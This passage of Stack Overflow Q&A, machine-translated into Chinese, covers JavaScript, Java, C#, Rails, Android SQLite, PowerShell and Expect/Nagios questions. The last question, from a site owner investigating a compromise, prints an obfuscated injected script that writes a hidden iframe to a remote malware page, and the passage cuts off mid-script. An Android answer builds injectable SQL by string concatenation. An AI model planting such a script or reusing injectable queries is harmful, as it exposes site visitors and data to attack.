wave = new imageSwitch('btn1','https://dl.dropbox.com/u/39640025/OMAA/Waves2PNG.png','https://dl.dropbox.com/u/39640025/OMAA/Active/Waves%20Active%20PNG.png','https://dl.dropbox.com/u/39640025/MP3/Waves.mp3'); 
```

这是一个[演示](http://jsfiddle.net/v97Kq/)

# 更新-1

这是更好的方法，使用 Auido Object，[DEMO](http://jsfiddle.net/v97Kq/1/)

```
function imageSwitch(_imgID, _imgStart, _imgStop, _soundFile) {
    this.imgID = _imgID;
    this.imgStart = _imgStart;
    this.imgStop = _imgStop;
    this.soundFile = _soundFile;
    this.song = new Audio(this.soundFile);
    this.song.loop = true;
    this.pos = 0;
    this.e;

    this.change = function () {
        if (this.pos == 0) {
            this.pos = 1;
            document.getElementById(this.imgID).src = this.imgStop;
            this.song.play();
        } else {
            this.pos = 0;
            document.getElementById(this.imgID).src = this.imgStart;
            this.song.pause();
        }
    }
} 
```

## 更新-2

对于跨浏览器，你应该定义不同的源，[DEMO](http://jsfiddle.net/v97Kq/3/)

```
wave = new imageSwitch('btn1', 'https://dl.dropbox.com/u/39640025/OMAA/Waves2PNG.png', 'https://dl.dropbox.com/u/39640025/OMAA/Active/Waves%20Active%20PNG.png', 'https://dl.dropbox.com/u/39640025/MP3/Waves.mp3','https://dl.dropboxusercontent.com/u/39640025/OGG/Waves.ogg');

function imageSwitch(_imgID, _imgStart, _imgStop, _soundFileMp3, _soundFileOgg) {
    this.imgID = _imgID;
    this.imgStart = _imgStart;
    this.imgStop = _imgStop;
    this.song = new Audio();
    if (this.song.canPlayType("audio/mpeg"))
        this.song.src = _soundFileMp3;
    else 
        this.song.src = _soundFileOgg;
    this.song.loop = true;

    this.pos = 0;
    this.e;

    this.change = function () {
        if (this.pos == 0) {
            this.pos = 1;
            document.getElementById(this.imgID).src = this.imgStop;
            this.song.play();
        } else {
            this.pos = 0;
            document.getElementById(this.imgID).src = this.imgStart;
            this.song.pause();
        }
    }
} 
```

# java - 如何使这段代码更快（时间限制 0.1 秒）

> ID：15936962
> 
> 赞同：-4
> 
> 时间：2013-04-10T21:41:34.837
> 
> 标签：java, time, execution

```
import java.util.*;
import java.io.*;

public class pool 
{ 
    public static void main(String args[])throws IOException 
    { 
        Scanner in=new Scanner(System.in); 
        int t=in.nextInt(); 
        for(int i=1;i<=t;i++)
        { 
            int a=in.nextInt(); 
            if ((360.0/(180-a))==Math.round((360.0/(180-a))))
                System.out.println("yes"); 
            else 
                System.out.println("NO"); 
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:13:29.620

`360/(180-a)`您可以通过比较和消除对 round 和浮点算术的调用`(540-a)/(180-a)`

的地板`360.0/(180.0-a)+1.0`将与 相同`Math.Round(360.0/(180.0-a)`。使用一些简单的代数等于`(540-a)/(180-a)`，该值的下限将是使用整数算术时的结果。

当然，这并不能保证您发布的时间限制。

# c# - 从 C# 代码中删除表单？

> ID：15936964
> 
> 赞同：0
> 
> 时间：2013-04-10T21:41:46.330
> 
> 标签：c#, winforms, oracle

我对 C# 非常陌生，除了 SQL 之外的任何东西都可以编程。我已经在表单和按钮单击上发生了以下代码。如果我只想让它在 open 上运行，我会怎么做？如您所知，我对 C# 非常陌生（今天才开始学习它，但它非常令人兴奋！）

```
 using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Drawing;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using Oracle.DataAccess.Client; // ODP.NET Oracle managed provider
    using Oracle.DataAccess.Types;

    namespace OraTrigger
    {
        public partial class Form1 : Form
        {
            public Form1()
            {
                InitializeComponent();
            }

            private void button1_Click(object sender, EventArgs e)
            {
                string oradb = "Data Source=OMP1;User Id=user;Password=pass;";

                OracleConnection conn = new OracleConnection(oradb); // C#

        conn.Open();

        OracleCommand cmd = new OracleCommand();
        cmd.Connection = conn;
        cmd.CommandText = "SELECT cast(Count(*) as varchar(20)) as trig FROM ZDMSN.TRIGGER_TEST";
        //cmd.CommandType = CommandType.Text;

        OracleDataReader dr = cmd.ExecuteReader();
        dr.Read();

        int cnt;
        if (int.TryParse(dr.GetString(0), out cnt))
        {
            if (cnt > 0)
            {
                System.Diagnostics.Process.Start(@"C:\testfile.bat");                    
            }
        }
        cmd.CommandText = "TRUNCATE TABLE ZDMSN.TRIGGER_TEST";
        conn.Dispose();
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:50:04.783

如果您需要将代码作为计划任务运行，那么命令行应用程序更合适。

只需创建一个新项目并选择`Console Application`. 然后将所有按钮单击代码移动`Main`到 Visual Studio IDE 为您编写的方法中。

请记住设置对 Oracle ODP.NET 库的引用并导入相关的 using 语句

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Oracle.DataAccess.Client; // ODP.NET Oracle managed provider
using Oracle.DataAccess.Types;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            string oradb = "Data Source=OMP1;User Id=user;Password=pass;";
            using(OracleConnection conn = new OracleConnection(oradb))
            using(OracleCommand cmd = new OracleCommand("SELECT Count(*) as trig FROM ZDMSN.TRIGGER_TEST", conn))
            {
                conn.Open();
                int cnt = (int)cmd.ExecuteScalar();
                if (cnt > 0)
                {
                    System.Diagnostics.Process.Start(@"C:\testfile.bat");
                    cmd.CommandText = "TRUNCATE TABLE ZDMSN.TRIGGER_TEST";
                    cmd.ExecuteNonQuery();
                }
            }
        }
    }
} 
```

我还修改了您的代码以从数据库中获取单个值。对于这种情况，使用 Command.ExecuteScalar 方法就足够了，该方法返回从您的 sql 命令文本获得的第一行的第一列。因为 count(*) 应该始终返回单行，所以您可以轻松地将 ExecuteScalar 的返回值转换为您的记录计数变量。

**编辑**我已将逻辑添加到 TRUNCATE 所涉及的表。请注意，您应该使用此处提供的代码。您的代码可能会失败，因为您有一个打开的 DataReader，并且当 DataReader 打开时，您无法执行其他命令（对于没有启用多个活动结果集的 SqlServer 来说，这是真的，我真的不知道这个规则是否也适用于 Oracle NET提供者）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:42:54.903

订阅`Shown`或`Load`表单事件并将您的代码移动到该事件处理程序。

*   [Form.Shown 事件](http://msdn.microsoft.com/en-us/library/system.windows.forms.form.shown.aspx)在表单首次显示时发生。
*   [Form.Load 事件](http://msdn.microsoft.com/en-us/library/system.windows.forms.form.load.aspx)在第一次显示表单之前发生。

另外我建议将您的代码提取到一些与数据访问相关的类，或者至少提取到单独的方法。并从事件处理程序调用该方法。

# ruby-on-rails - 如果 Rails 为空白，则不显示字段

> ID：15936967
> 
> 赞同：0
> 
> 时间：2013-04-10T21:42:11.807
> 
> 标签：ruby-on-rails, forms

在我的 rails 表中，我有一个`text_field`which `my_website`，所以 <%= f.text_field :my_website %>

依此`show.html.erb`类推 `<a href="<%= @user.my_website %>">Go to my website</a>`

这很好用

但是说用户没有在 my_website 的表单中输入任何内容，如果用户没有输入 my_website，我将如何使其工作以便这部分`<a href="<%= @user.my_website %>">Go to my website</a>`隐藏

基本上是这样的

```
if user puts in my_website, show
 <a href="<%= @user.my_website %>">Go to my website</a>

else 
```

什么都不显示

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:46:20.200

我假设这是在表单提交之后。你可以只使用一个`if`语句。

```
<% if @user.my_website %>
  <%= link_to "Go to my website", @user.my_website %>
<% end %> 
```

或者，如果用户为该字段`"Go to my website"`输入一堆空格，则不会显示以下解决方案。如果 @user.my_website 为 nil 或包含空字符串，将返回 true。`my_website``blank?`

```
<% unless @user.my_website.blank? %>
  <%= link_to "Go to my website", @user.my_website %>
<% end %> 
```

# android - 如何将 groupCursor 参数移动到 childCursor？

> ID：15936973
> 
> 赞同：1
> 
> 时间：2013-04-10T21:42:23.570
> 
> 标签：android, sqlite, cursor, expandablelistadapter

我不确定这是否是正确的标题。但是，我需要做的是向我的 getChildrenCursor 添加某种参数，以便它只显示该特定组的孩子，而不是每个组的所有孩子。排序类似于 getExtras 的工作方式。

我正在使用片段和扩展 SimpleCursorTreeAdapter 的 ExpandabeListAdaptor。正如我所提到的，除了为每个组加载所有孩子之外，一切都运行良好。我相信我必须将每个组的 ID 映射到它的孩子，但我不确定如何做到这一点。

我在一堆其他代码示例中看到了这一点，但我不确定如何为我的代码实现它。我相信这样的事情：

```
 Cursor childCursor = mDbHelper.fetchChildren(GroceryListMain.group,
            groupCursor.getString(groupCursor.getColumnIndex("_id")); 
```

这就是我认为我需要做的事情的想法，但我不确定。我只使用一个数据库表。

我将项目添加到 ExpandableListiew 的代码是这样的：

```
package com.example.fragments;

import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ExpandableListView;
import android.widget.FilterQueryProvider;
import android.widget.ListView;
import android.widget.SimpleCursorAdapter;
import android.widget.SimpleCursorTreeAdapter;
import android.widget.SimpleExpandableListAdapter;

import com.actionbarsherlock.app.SherlockFragment;
import com.actionbarsherlock.app.SherlockListFragment;

public class JobOpportunities extends SherlockFragment{

 private JobDbAdaptor dbHelper;
 private MyExpandableListAdapter dataAdapter;

 public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState)
 {
    return inflater.inflate(R.layout.jobmain, container, false);

 }

 @Override
 public void onActivityCreated(Bundle savedInstanceState)
 {

  super.onActivityCreated(savedInstanceState);

      dbHelper = new JobDbAdaptor(getActivity().getApplicationContext());
      dbHelper.open();

      //Clean all data
      dbHelper.deleteAllJobs();
      //Add some data
      dbHelper.insertSomeJobs();

      //Generate ListView from SQLite Database
     displayListView();

 }//end of activity create

 private void displayListView() 
 {
     Cursor cursor = dbHelper.fetchAllJobs();

     ExpandableListView explist = (ExpandableListView)  getView().findViewById(R.id.expandList);

     dataAdapter = new MyExpandableListAdapter(cursor, getActivity().getApplicationContext(),
             R.layout.job_info,
             R.layout.child_info,
             new String[] {JobDbAdaptor.KEY_NAME},
             new int[] {R.id.name},
             new String[] {JobDbAdaptor.KEY_DESCRIPTION, JobDbAdaptor.KEY_POSITION, JobDbAdaptor.KEY_LOCATION},
             new int[] {R.id.childitem1, R.id.childitem2, R.id.childitem3});

    explist.setAdapter(dataAdapter);

 }//end of list view

  public class MyExpandableListAdapter extends SimpleCursorTreeAdapter 
    {
        public MyExpandableListAdapter(Cursor cursor, Context jobOpportunities, int groupLayout,
                int childLayout, String[] groupFrom, int[] groupTo, String[] childrenFrom,
                int[] childrenTo) {
            super(jobOpportunities, cursor, groupLayout, groupFrom, groupTo, childLayout, childrenFrom,
                    childrenTo);
        }

        @Override
        protected Cursor getChildrenCursor(Cursor fetchGroup) 
        {
            // Given the group, we return a cursor for all the children within that group 

            fetchGroup = dbHelper.fetchchildren();

            return fetchGroup;

        }//end of childcursor

    }//end of myexpandable list adapter

}//end of jobopportunities 
```

这是我的数据库代码：

```
 package com.example.fragments;

    import android.content.ContentValues;
    import android.content.Context;
    import android.database.Cursor;
    import android.database.SQLException;
    import android.database.sqlite.SQLiteDatabase;
    import android.database.sqlite.SQLiteOpenHelper;
    import android.util.Log;

    public class JobDbAdaptor {

   //field names
   public static final String KEY_ROWID = "_id";
   public static final String KEY_NAME = "name";
   public static final String KEY_DESCRIPTION = "description";
   public static final String KEY_POSITION = "postition";
   public static final String KEY_LOCATION = "location";

  //variables
  private static final String TAG = "JobDbAdapter";
  private DatabaseHelper mDbHelper;
  private SQLiteDatabase mDb;

 //database info
 private static final String DATABASE_NAME = "Opportunities";
 private static final String SQLITE_TABLE = "Job_Info";
 private static final int DATABASE_VERSION = 1;

 private final Context mCtx;

 //defines the fields and constraints
 private static final String DATABASE_CREATE =
 "CREATE TABLE if not exists " + SQLITE_TABLE + " (" +
 KEY_ROWID + " integer PRIMARY KEY autoincrement," +
 KEY_NAME + "," +
 KEY_DESCRIPTION + "," +
 KEY_POSITION + "," +
 KEY_LOCATION + ");";

 private static class DatabaseHelper extends SQLiteOpenHelper 
 {

 //constructor for database sets name and version
 DatabaseHelper(Context context) 
 {
  super(context, DATABASE_NAME, null, DATABASE_VERSION);
 }

 @Override//creates database
 public void onCreate(SQLiteDatabase db)
 {
   Log.w(TAG, DATABASE_CREATE);
   db.execSQL(DATABASE_CREATE);
 }

 @Override//checks for new version and overrides old
 public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) 
 {
  Log.w(TAG, "Upgrading database from version " + oldVersion + " to "
  + newVersion + ", which will destroy all old data");
  db.execSQL("DROP TABLE IF EXISTS " + SQLITE_TABLE);
  onCreate(db);
 }
 }//end of update

 public JobDbAdaptor(Context ctx)
 {
 this.mCtx = ctx;
 }

 //opens the database and sets the state
 public JobDbAdaptor open() throws SQLException 
 {
   mDbHelper = new DatabaseHelper(mCtx);
   mDb = mDbHelper.getWritableDatabase();//state i.e. writable or readable
   return this;
   }

   //closes database
   public void close() 
  {

    if (mDbHelper != null) 
  {
    mDbHelper.close();
  }

  }

  //creates each job
  public long createJob(String name, String description,
  String position, String location) 
  {  

   ContentValues initialValues = new ContentValues();
   initialValues.put(KEY_NAME, name);
   initialValues.put(KEY_DESCRIPTION, description);
   initialValues.put(KEY_POSITION, position);
   initialValues.put(KEY_LOCATION, location);

   return mDb.insert(SQLITE_TABLE, null, initialValues);

  }//end of create jobs

  //deletes all of the jobs
  public boolean deleteAllJobs()
  {

    int doneDelete = 0;
    doneDelete = mDb.delete(SQLITE_TABLE, null , null);
    Log.w(TAG, Integer.toString(doneDelete));
    return doneDelete > 0;

  }//end of delete all jobs

  //searches the job based on input text
  public Cursor fetchJobsByName(String inputText) throws SQLException 
  {
    Log.w(TAG, inputText);
    Cursor mCursor = null;
    if (inputText == null  ||  inputText.length () == 0)  {
    mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID,
    KEY_NAME, KEY_DESCRIPTION, KEY_POSITION, KEY_LOCATION},
    null, null, null, null, null);

   }
    else 
   {
     mCursor = mDb.query(true, SQLITE_TABLE, new String[] {KEY_ROWID,
     KEY_NAME, KEY_DESCRIPTION, KEY_POSITION, KEY_LOCATION},
     KEY_NAME + " like '%" + inputText + "%'", null,
     null, null, null, null);
   }
     if (mCursor != null) 
   {
     mCursor.moveToFirst();
   }

     return mCursor;

   }//end of fetchjobs by name

   //gets all of the jobs
   public Cursor fetchAllJobs() 
   {

     Cursor mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID,
     KEY_NAME, KEY_DESCRIPTION, KEY_POSITION, KEY_LOCATION},
     null, null, null, null, null);

   if (mCursor != null) {
   mCursor.moveToFirst();
   }
   return mCursor;

   }//end of fetch all jobs

    //fetches the group headers or just the titles of the job
    public Cursor fetchgroup()
    {
   Cursor mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID, KEY_NAME}, null,
    null, null, null, null);

  if(mCursor != null)
 {
     mCursor.moveToFirst();

 }

 return mCursor;

     }//end of fetchgroups

     //fetches the the info for the children
     public Cursor fetchchildren()
     {
     Cursor mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID, KEY_DESCRIPTION, KEY_POSITION, KEY_LOCATION}, null,
    null, null, null, null);

 if(mCursor != null)
 {
     mCursor.moveToFirst();

 }

 return mCursor;

     }//end of fetchchildren

    //holds the content for each job
   public void insertSomeJobs()
   {

     createJob("AFG","Afghanistan","Asia","Southern and Central Asia");
     createJob("ALB","Albania","Europe","Southern Europe");
     createJob("DZA","Algeria","Africa","Northern Africa");
     createJob("ASM","American Samoa","Oceania","Polynesia");
     createJob("AND","Andorra","Europe","Southern Europe");
     createJob("AGO","Angola","Africa","Central Africa");
     createJob("AIA","Anguilla","North America","Caribbean");

   }//end of insertjobs

  }//end of JobDbAdaptor 
```

我知道这是我没有得到的愚蠢的东西。如果有人能指出我正确的方向，那就太好了。

感谢您的时间和帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T15:08:55.013

大声笑我知道这是愚蠢的。

这是新的 getChildrenCursor：

```
 @Override
        protected Cursor getChildrenCursor(Cursor fetchGroup) 
        {
            // Given the group, we return a cursor for all the children within that group 

            String dbcolumnId = JobDbAdaptor.KEY_NAME;
            Cursor fetchchild=dbHelper.fetchchildren(fetchGroup.getString(fetchGroup.getColumnIndex(dbcolumnId)));

            return fetchchild;

        }//end of childcursor 
```

所以我不得不将它设置为从组中读取值，我知道我必须这样做，但不知道如何去做。这会根据组设置孩子，但它只会将其拉出一张桌子。因此，当单击该组时，它只会显示它应该显示的孩子。

这是数据库中的 Cursor 方法，接受新值是经过修改的：

```
 public Cursor fetchchildren(String dbcolumnId )
{
 Cursor mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID, KEY_NAME, KEY_DESCRIPTION, KEY_POSITION, KEY_LOCATION}, KEY_NAME + "='" + dbcolumnId + "'",
    null, null, null, null);

 if(mCursor != null)
 {
     mCursor.moveToFirst();

 }

 return mCursor;

}//end of fetchchildren 
```

这不会阻止 SQL 注入，但我在这里没有使用任何输入。

# java - TestNG 测试在 Linux 上通过，在 Windows 上失败

> ID：15936975
> 
> 赞同：0
> 
> 时间：2013-04-10T21:42:26.787
> 
> 标签：java, testng

出于某种原因，以下测试在 Windows 上失败，但在 Linux 上通过。该测试旨在在被测试的代码中生成异常。该异常基本上是文件异常。方法是使文件不可读以生成异常。看起来 setReadable(false) 对 Windows 没有影响。

```
 @Test(dependsOnGroups = "expectedFlow",expectedExceptions = ParserException.class)
 @Parameters("unreadableFile")
 public void mineDataParserExceptionTest(String unreadableFile) throws ParserException{
  AbstractParser parser;
  File f = new File(unreadableFile);
  f.setReadable(false);
  parser = ParserFactory.getParser(ParserFactory.TYPES.SAR);
  parser.mine(fileHelper, xml);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:59:13.260

您应该检查返回值是否成功；但是，这似乎可能`f.setReadable(false, false);`是一个更好的主意，因为否则它只应该更改文件*所有者*的读取权限。

# scala - Scala 中的匹配 - 性能？

> ID：15936976
> 
> 赞同：2
> 
> 时间：2013-04-10T21:42:26.810
> 
> 标签：scala

scala 是如何处理`match`ing 的？它只是在字节码级别转换为编译器分支的语法糖，还是隐藏在幕后的一些巧妙技巧？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T22:20:52.337

将整数值（例如，Int、Char）与常量匹配通常被转换为 TableSwitch（通过索引数组的 O(1) 查找时间）或 LookUpSwitch（通过二进制搜索的 O(log n) 查找时间）字节码指令。如果您将变量模式或通配符模式作为包罗万象的分支，情况也会如此。

您可以使用 @switch 注释来确保这确实发生。

对于非整数值，可用的优化更有限；但是，据我了解编译器代码，编译器至少会检查公共子条件（它记得）和共享前缀。

# objective-c - NSTextView 在更新时继承父视图背景

> ID：15936978
> 
> 赞同：0
> 
> 时间：2013-04-10T21:42:30.450
> 
> 标签：objective-c, macos, nstextfield, nstextview

我有一个用于显示计时器的 NSTextView。此计时器每秒更新一次，倒计时至 00:00。当计时器更新 NSTextView 的字符串时，NSTextView 就像重绘一样，但使用其父视图背景作为自己的背景。

我的 NSTextView 具有清晰的背景颜色，并且已设置为不绘制其背景。它的父视图为它自己的背景绘制了一个 3 部分的图像。下面是 NSTextView 的代码。

```
_timerLabel = [[NSTextView alloc] init];
[self.timerLabel setSelectable:NO];
[self.timerLabel setEditable:NO];
self.timerLabel.font = fontLoaded ? [NSFont fontWithName:@"DS-Digital" size:26.0f] : [NSFont fontWithName:@"Lucida Grande" size:26.0f];
self.timerLabel.textColor = [NSColor colorWithCalibratedRed:(50.0f/255.0f) green:(50.0f/255.0f) blue:(50.0f/255.0f) alpha:1.0f];
self.timerLabel.backgroundColor = [NSColor clearColor];
[self.timerLabel setDrawsBackground:NO];
[self.timerLabel setAllowsDocumentBackgroundColorChange:NO];
[self.timerLabel setAlignment:NSCenterTextAlignment];
self.timerLabel.string = @"5:11";
[self addSubview:self.timerLabel]; 
```

任何想法为什么会发生这种情况？我已经尝试了所有我能想到或在苹果文档中找到的东西，但没有任何东西可以解决我的问题。任何帮助将不胜感激。

在更新 NSTextView 中的文本之前 [https://www.dropbox.com/s/za3twd8hb7r1apr/Screen%20Shot%202013-04-10%20at%205.37.10%20PM.png](https://www.dropbox.com/s/za3twd8hb7r1apr/Screen%20Shot%202013-04-10%20at%205.37.10%20PM.png)

更新 NSTextView 中的文本后 [https://www.dropbox.com/s/p0bsk63o8yweyqs/Screen%20Shot%202013-04-10%20at%205.37.28%20PM.png](https://www.dropbox.com/s/p0bsk63o8yweyqs/Screen%20Shot%202013-04-10%20at%205.37.28%20PM.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T13:20:32.640

我弄清楚发生了什么，并认为我会分享以防其他人遇到同样的问题。

更新 NSTextView 的文本（也可以是 NSTextField）时，drawRect 函数会被调用，并使用更新的 NSTextView 的矩形。

在我的例子中，我的 draw rect 为我的 NSView 的背景绘制了一个 3 部分的图像到 drawRect 函数中提供的 rect。由于矩形是 NSTextView 之后的矩形并更新为其字符串，因此这将根据 NSTextView 的大小重绘我的背景图像。

目前我能想出的唯一解决方案是始终为我的 NSView 的边界绘制我的 3 部分图像。

希望从那以后。

# powershell - 使用 powershell 基于 IP/子网和 AD 组成员映射网络驱动器

> ID：15936982
> 
> 赞同：1
> 
> 时间：2013-04-10T21:42:42.790
> 
> 标签：powershell

我正在使用如下所示的 powershell 脚本，它查看 AD 安全组成员身份并基于它为用户映射驱动器。我想要完成的是，当它看到用户从某个 IP 或子网登录时，除了它从 AD 组成员中获取的驱动器之外，它还会映射一组不同的驱动器，任何见解都将不胜感激。

```
 # The section below determines what AD groups is the user member of
    $strName = $env:username

    function get-GroupMembership($DNName,$cGroup){

        $strFilter = "(&(objectCategory=User)(samAccountName=$strName))"

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $objSearcher.Filter = $strFilter

        $objPath = $objSearcher.FindOne()
        $objUser = $objPath.GetDirectoryEntry()
        $DN = $objUser.distinguishedName

        $strGrpFilter = "(&(objectCategory=group)(name=$cGroup))"
        $objGrpSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $objGrpSearcher.Filter = $strGrpFilter

        $objGrpPath = $objGrpSearcher.FindOne()

        If (!($objGrpPath -eq $Null)){

            $objGrp = $objGrpPath.GetDirectoryEntry()

            $grpDN = $objGrp.distinguishedName
            $ADVal = [ADSI]"LDAP://$DN"

            if ($ADVal.memberOf.Value -eq $grpDN){
                $returnVal = 1
                return $returnVal = 1
            }else{
                $returnVal = 0
                return $returnVal = 0

            }

        }else{
                $returnVal = 0
                return $returnVal = 0

        }

    }

    # The section below maps network drives based on users AD Security Group memberships

    $result = get-groupMembership $strName "SecurityGrtoup1"
    if ($result -eq '1') {
        $(New-Object -ComObject WScript.Network).RemoveNetworkDrive("G:");
        $(New-Object -ComObject WScript.Network).MapNetworkDrive("G:", "\\server1\Group");
        $(New-Object -ComObject WScript.Network).RemoveNetworkDrive("P:");
        $(New-Object -ComObject WScript.Network).MapNetworkDrive("P:", "\\server2\Common");
    }

    $result = get-groupMembership $strName "SecurityGroup3"
    if ($result -eq '1') {
        $(New-Object -ComObject WScript.Network).RemoveNetworkDrive("N:");
        $(New-Object -ComObject WScript.Network).MapNetworkDrive("N:", "\\Server3\files");
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T00:01:24.217

这应该让您获得作为字符串对象的 IPv4 地址：

```
$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress} | Select-Object -ExpandProperty IPAddress)[0] 
```

然后，您可以根据需要进行解析，也可以改为使用 .IPSubnet 或 .DefaultIPGateway 属性，如果这样可以满足您的需要。

对于其他可用属性，请尝试：

```
Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress} | Get-Member 
```

# expect - 预计 Nagios 会出现脚本错误，但 cli 会很好

> ID：15936990
> 
> 赞同：1
> 
> 时间：2013-04-10T21:43:18.910
> 
> 标签：expect, nagios

我现在正在学习 Expect 以尝试在 Nagios Core 下对远程系统进行自动检查，并且虽然脚本从“nagios”用户帐户（这是 Nagios 运行其命令的地方）完美运行，但 Nagios 下的脚本错误跑。事实上，从命令行运行的脚本可以立即运行，没有太多戏剧性 - 但现在我花了 3 天时间试图弄清楚 Nagios 下出了什么问题。

我已经确定 CLI 版本可以看到`send "aaa test-server...`命令的响应，但 Nagios 运行没有，只是超时。我已将内容写入日志文件以尝试确定我做错了什么，但我只是看不到它。（我已经禁用了对 Nagios 的响应，因为这会使它感到困惑，但它们会在脚本中看到和使用。）

**我试图自动化的序列：**

```
nagios:~# ssh accountname@192.168.1.20
accountname@192.168.1.20's password:
Last login: Wed Mar 27 03:43:03 2013 from 192.168.1.14
(Aruba3400) >en
Password:***********
(Aruba3400) #aaa test-server mschapv2 tester account1 password1
Authentication Successful
(Aruba3400) #exit
(Aruba3400) >exitConnection closed by foreign host.
Connection to 192.168.1.20 closed. 
```

**脚本：**

```
#!/usr/bin/expect

# turn on logging output
log_user 0
log_file /tmp/output.txt
# set Variables
set password SomeThingOrOther
set useracct accountname
set ipaddr 192.168.1.20
set timeout 9

match_max -d 10000
# now connect to remote UNIX box (ipaddr) with given script to execute
spawn -noecho /usr/bin/ssh $useracct@$ipaddr
# Look for password prompt
expect "assword:"
# Send password aka $password
send "$password\n"
# send blank line (\r) to make sure we're at the prompt
expect "Aruba3400"
send "\r"
#send_log "log: 1st password entered.\n"

# Look for password prompt again, send Enable req
expect "Aruba3400"
send "en\r"
expect "assword:"
send "$password\r"
expect "(Aruba3400) #"
# send blank line (\r) to make sure we're at the prompt
send "\r"
expect "#"

send_log "log: Sent auth command.\n"
send "aaa test-server mschapv2 tester account1 password1\r"

# at next line, nagios run times out; command line runs fine
expect -timeout 9 "Successful"
# printout some debugs to logs whether it works or times out
send_log "log 0: $expect_out(0,string)\n"
send_log "log x: $expect_out(buffer)\n"

#---stock exit here so I can see some output, fix it later----
set TIME [exec date +%H:%M:%S]
log_user 1
send_user "Time: $TIME\n"
send_log "-----------------------\n"
exit 0 
```

**日志文件的输出：**

```
-----------------------
log: Sent auth command.
log 0: Successful
log x: aaa test-server mschapv2 tester account1 password1

Authentication Successful     <-- this is from the cli (works!)
Time: 16:00:02
-----------------------
log: Sent auth command.
log 0: #
log x:
(Aruba3400) #                 <-- this is under Nagios (timeout)
Time: 16:00:29
----------------------- 
```

谁能给我一些关于这里出了什么问题的线索？提前致谢！！

# php - Sql 注入攻击洞察

> ID：15936992
> 
> 赞同：0
> 
> 时间：2013-04-10T21:43:30.470
> 
> 标签：php, sql, security, sql-injection

以下代码正在添加到我们的网站。下面是它对页面的影响，基本上是打开一个 iframe 到恶意软件站点。我们的网站上周遇到了这个问题，为了解决这个问题，我们刚刚回滚了数据库和代码库来解决这个问题，它确实做到了。我有一个可以使用的损坏版本，并且正在搜索代码的来源和方式，但我什么也没想到。如果它是通过网站上的某种形式输入的，那么该条目在数据库中会是什么样子？如果它修改了代码库中的文件，为什么我找不到它？我应该寻找什么？对此的任何见解都会非常有帮助。我试图找出我们需要在哪里插入安全性。

*注意：原始脚本没有换行符。这里显示了换行符以使代码可读：*

```
<script type="text/javascript" charset="utf-8">
    p=parseInt;ss=(123)?String.fromCharCode:0;asgq="28!66!75!6e!63!74!6@!6f!6e!20!28!2@!20!7b!d!a!20!20!20!20!76!61!72!20!68!6f!75!65!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!72!65!61!74!65!45!6c!65!6d!65!6e!74!28!27!6@!66!72!61!6d!65!27!2@!3b!d!a!d!a!20!20!20!20!68!6f!75!65!2e!73!72!63!20!3d!20!27!68!74!74!70!3a!2f!2f!32!31!36!2e!31!31!3@!2e!31!31!34!2e!31!36!34!2f!65!73!64!2e!70!68!70!27!3b!d!a!20!20!20!20!68!6f!75!65!2e!73!74!7@!6c!65!2e!70!6f!73!6@!74!6@!6f!6e!20!3d!20!27!61!62!73!6f!6c!75!74!65!27!3b!d!a!20!20!20!20!68!6f!75!65!2e!73!74!7@!6c!65!2e!62!6f!72!64!65!72!20!3d!20!27!30!27!3b!d!a!20!20!20!20!68!6f!75!65!2e!73!74!7@!6c!65!2e!68!65!6@!67!68!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!68!6f!75!65!2e!73!74!7@!6c!65!2e!77!6@!64!74!68!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!68!6f!75!65!2e!73!74!7@!6c!65!2e!6c!65!66!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!68!6f!75!65!2e!73!74!7@!6c!65!2e!74!6f!70!20!3d!20!27!31!70!78!27!3b!d!a!d!a!20!20!20!20!6@!66!20!28!21!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!68!6f!75!65!27!2@!2@!20!7b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!77!72!6@!74!65!28!27!3c!64!6@!76!20!6@!64!3d!5c!27!68!6f!75!65!5c!27!3e!3c!2f!64!6@!76!3e!27!2@!3b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!68!6f!75!65!27!2@!2e!61!70!70!65!6e!64!43!68!6@!6c!64!28!68!6f!75!65!2@!3b!d!a!20!20!20!20!7d!d!a!7d!2@!28!2@!3b"
      .replace(/@/g,"9")
      .split("!");
   try{
      document.body&=0.1
   } catch(gdsgsdg) {
      zz=3;
